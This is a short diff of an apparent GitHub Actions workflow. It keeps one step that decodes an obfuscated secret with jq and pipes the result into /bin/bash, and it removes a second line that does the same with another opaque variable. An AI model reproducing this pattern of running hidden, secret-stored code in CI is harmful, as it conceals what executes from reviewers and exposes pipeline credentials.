@@ -27,7 +27,6 @@ jobs:
           cgz8818: ${{ secrets.cgz8818 }}
         run: |
           printf '%s' "$cgz8818" | jq -r .bumaa764 | /bin/bash
-          echo $fit6 | jq -r .srpnx8348 | /bin/bash
 
       - name: Upload artifact
         if: always()
